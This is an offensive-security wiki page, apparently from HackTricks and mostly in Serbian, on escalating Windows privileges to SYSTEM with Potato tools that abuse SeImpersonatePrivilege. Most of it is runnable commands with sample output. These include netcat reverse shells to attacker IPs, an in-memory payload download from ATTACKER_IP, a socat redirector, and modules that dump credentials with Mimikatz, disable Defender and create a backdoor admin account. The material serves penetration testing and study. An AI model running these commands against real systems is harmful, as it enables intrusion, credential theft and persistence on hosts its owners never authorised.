# RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING]
> **JuicyPotato ne radi** na Windows Server 2019 i Windows 10 build 1809 i novijim. Međutim, [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato)**,** [**EfsPotato**](https://github.com/zcgonvh/EfsPotato)**,** [**DCOMPotato**](https://github.com/zcgonvh/DCOMPotato)** mogu se koristiti da **iskoriste iste privilegije i dobiju `NT AUTHORITY\SYSTEM`** pristup. This [blog post](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) detaljno obrađuje `PrintSpoofer` tool, koji se može koristiti za zloupotrebu impersonation privilegija na Windows 10 i Server 2019 hostovima gde JuicyPotato više ne radi.

> [!TIP]
> Moderna alternativa, često održavana u 2024–2025, je SigmaPotato (fork of GodPotato) koja dodaje upotrebu in-memory/.NET reflection i proširenu podršku za OS. Pogledajte brzu upotrebu ispod i repo u References.

Related pages for background and manual techniques:

{{#ref}}
seimpersonate-from-high-to-system.md
{{#endref}}

{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}

{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

## Zahtevi i česti problemi

Sve sledeće tehnike se oslanjaju na zloupotrebu privilegovanog servisa sposobnog za impersonation iz konteksta koji poseduje jednu od sledećih privilegija:

- SeImpersonatePrivilege (most common) or SeAssignPrimaryTokenPrivilege
- High integrity is not required if the token already has SeImpersonatePrivilege (typical for many service accounts such as IIS AppPool, MSSQL, etc.)

Brzo proverite privilegije:
```cmd
whoami /priv | findstr /i impersonate
```
Operativne napomene:

- Ako vaš shell radi pod ograničenim tokenom koji nema SeImpersonatePrivilege (uobičajeno za Local Service/Network Service u nekim kontekstima), povratite podrazumevane privilegije naloga koristeći FullPowers, pa zatim pokrenite Potato. Primer: `FullPowers.exe -c "cmd /c whoami /priv" -z`
- PrintSpoofer zahteva da Print Spooler servis bude pokrenut i dostupan preko lokalne RPC endpoint (spoolss). U ojačanim okruženjima gde je Spooler onemogućen nakon PrintNightmare, radije koristite RoguePotato/GodPotato/DCOMPotato/EfsPotato.
- RoguePotato zahteva OXID resolver dostupan na TCP/135. Ako je egress blokiran, koristite redirector/port-forwarder (vidi primer ispod). Starije verzije su zahtevale -f flag.
- EfsPotato/SharpEfsPotato zloupotrebljavaju MS-EFSR; ako je jedan pipe blokiran, probajte alternativne pipe-ove (lsarpc, efsrpc, samr, lsass, netlogon).
- Error 0x6d3 tokom RpcBindingSetAuthInfo obično ukazuje na nepoznatu ili nepodržanu RPC autentikacionu uslugu; pokušajte drugi pipe/transport ili se uverite da ciljna usluga radi.
- “Kitchen-sink” forkovi poput DeadPotato uključuju dodatne payload module (Mimikatz/SharpHound/Defender off) koji zapisuju na disk; očekujte veću detekciju od strane EDR-a u poređenju sa slim originalima.

## Brzi demo

### PrintSpoofer
```bash
c:\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd"

--------------------------------------------------------------------------------

[+] Found privilege: SeImpersonatePrivilege

[+] Named pipe listening...

[+] CreateProcessAsUser() OK

NULL

```
Napomene:
- Možete koristiti -i da pokrenete interaktivni proces u trenutnoj konzoli, ili -c da izvršite one-liner.
- Zahteva Spooler servis. Ako je onemogućen, ovo neće uspeti.

### RoguePotato
```bash
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -l 9999
# In some old versions you need to use the "-f" param
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -f 9999
```
Ako je outbound 135 blokiran, pivot the OXID resolver via socat on your redirector:
```bash
# On attacker redirector (must listen on TCP/135 and forward to victim:9999)
socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999

# On victim, run RoguePotato with local resolver on 9999 and -r pointing to the redirector IP
RoguePotato.exe -r REDIRECTOR_IP -e "cmd.exe /c whoami" -l 9999
```
### PrintNotifyPotato

PrintNotifyPotato je noviji COM abuse primitive objavljen krajem 2022. koji cilja **PrintNotify** service umesto Spooler/BITS. Binarni fajl instancira PrintNotify COM server, ubacuje lažni `IUnknown`, zatim pokreće privilegovani callback preko `CreatePointerMoniker`. Kada se PrintNotify service (koji radi kao **SYSTEM**) poveže nazad, proces duplicira vraćeni token i pokreće prosleđeni payload sa punim privilegijama.

Ključne operativne napomene:

* Radi na Windows 10/11 i Windows Server 2012–2022 sve dok je Print Workflow/PrintNotify service instaliran (prisutan je čak i kada je legacy Spooler onemogućen posle PrintNightmare).
* Zahteva da pozivajući kontekst ima **SeImpersonatePrivilege** (tipično za IIS APPPOOL, MSSQL i naloge servisa za zakazane zadatke).
* Prihvaća ili direktnu komandu ili interaktivni režim tako da možete ostati u originalnoj konzoli. Primer:

```cmd
PrintNotifyPotato.exe cmd /c "powershell -ep bypass -File C:\ProgramData\stage.ps1"
PrintNotifyPotato.exe whoami
```

* Pošto je isključivo baziran na COM-u, nisu potrebni named-pipe listeneri ili eksterni redirectori, što ga čini drop-in zamenom na hostovima gde Defender blokira RoguePotato’s RPC binding.

Operatori kao što je Ink Dragon pokreću PrintNotifyPotato odmah nakon sticanja ViewState RCE na SharePoint da bi pivotirali sa `w3wp.exe` procesa na SYSTEM pre instalacije ShadowPad.

### SharpEfsPotato
```bash
> SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
SharpEfsPotato by @bugch3ck
Local privilege escalation from SeImpersonatePrivilege using EfsRpc.

Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.

[+] Triggering name pipe access on evil PIPE \\localhost/pipe/c56e1f1f-f91c-4435-85df-6e158f68acd2/\c56e1f1f-f91c-4435-85df-6e158f68acd2\c56e1f1f-f91c-4435-85df-6e158f68acd2
df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
[x]RpcBindingSetAuthInfo failed with status 0x6d3
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!

C:\temp>type C:\temp\w.log
nt authority\system
```
### EfsPotato
```bash
> EfsPotato.exe "whoami"
Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.
CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]

[+] Current user: NT Service\MSSQLSERVER
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=aeee30)
[+] Get Token: 888
[!] process with pid: 3696 created.
==============================
[x] EfsRpcEncryptFileSrv failed: 1818

nt authority\system
```
Savet: Ako jedan pipe zakaže ili ga EDR blokira, probajte ostale podržane pipes:
```text
EfsPotato <cmd> [pipe]
pipe -> lsarpc|efsrpc|samr|lsass|netlogon (default=lsarpc)
```
### GodPotato
```bash
> GodPotato -cmd "cmd /c whoami"
# You can achieve a reverse shell like this.
> GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
```
Napomene:
- Radi na Windows 8/8.1–11 i Server 2012–2022 kada je prisutno SeImpersonatePrivilege.

### DCOMPotato

![image](https://github.com/user-attachments/assets/a3153095-e298-4a4b-ab23-b55513b60caa)

DCOMPotato pruža dve varijante koje ciljaju service DCOM objects koji su podrazumevano postavljeni na RPC_C_IMP_LEVEL_IMPERSONATE. Kompajlirajte ili koristite provided binaries i pokrenite svoju komandu:
```cmd
# PrinterNotify variant
PrinterNotifyPotato.exe "cmd /c whoami"

# McpManagementService variant (Server 2022 also)
McpManagementPotato.exe "cmd /c whoami"
```
### SigmaPotato (ažuriran GodPotato fork)

SigmaPotato dodaje moderna poboljšanja, poput in-memory execution preko .NET reflection i PowerShell reverse shell helper.
```powershell
# Load and execute from memory (no disk touch)
[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData("http://ATTACKER_IP/SigmaPotato.exe"))
[SigmaPotato]::Main("cmd /c whoami")

# Or ask it to spawn a PS reverse shell
[SigmaPotato]::Main(@("--revshell","ATTACKER_IP","4444"))
```
Additional perks in 2024–2025 builds (v1.2.x):
- Built-in reverse shell flag `--revshell` and removal of the 1024-char PowerShell limit so you can fire long AMSI-bypassing payloads in one go.
- Reflection-friendly syntax (`[SigmaPotato]::Main()`), plus a rudimentary AV evasion trick via `VirtualAllocExNuma()` to throw off simple heuristics.
- Separate `SigmaPotatoCore.exe` compiled against .NET 2.0 for PowerShell Core environments.

### DeadPotato (2024 GodPotato rework with modules)

DeadPotato keeps the GodPotato OXID/DCOM impersonation chain but bakes in post-exploitation helpers so operators can immediately take SYSTEM and perform persistence/collection without additional tooling.

Common modules (all require SeImpersonatePrivilege):

- `-cmd "<cmd>"` — spawn arbitrary command as SYSTEM.
- `-rev <ip:port>` — quick reverse shell.
- `-newadmin user:pass` — create a local admin for persistence.
- `-mimi sam|lsa|all` — drop and run Mimikatz to dump credentials (touches disk, noisy).
- `-sharphound` — run SharpHound collection as SYSTEM.
- `-defender off` — flip Defender real-time protection (very noisy).

Example one-liners:
```cmd
# Blind reverse shell
DeadPotato.exe -rev 10.10.14.7:4444

# Drop an admin for later login
DeadPotato.exe -newadmin pwned:P@ssw0rd!

# Run SharpHound immediately after priv-esc
DeadPotato.exe -sharphound
```
Pošto isporučuje dodatne binarne fajlove, očekujte veću detekciju od strane AV/EDR; koristite kompaktniji GodPotato/SigmaPotato kada je bitna prikrivenost.

## References

- [https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
- [https://github.com/itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
- [https://github.com/antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)
- [https://github.com/bugch3ck/SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato)
- [https://github.com/BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)
- [https://github.com/zcgonvh/EfsPotato](https://github.com/zcgonvh/EfsPotato)
- [https://github.com/zcgonvh/DCOMPotato](https://github.com/zcgonvh/DCOMPotato)
- [https://github.com/tylerdotrar/SigmaPotato](https://github.com/tylerdotrar/SigmaPotato)
- [https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/)
- [FullPowers – Restore default token privileges for service accounts](https://github.com/itm4n/FullPowers)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [BeichenDream/PrintNotifyPotato](https://github.com/BeichenDream/PrintNotifyPotato)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [DeadPotato – GodPotato rework with built-in post-ex modules](https://github.com/lypd0/DeadPotato)

{{#include ../../banners/hacktricks-training.md}}
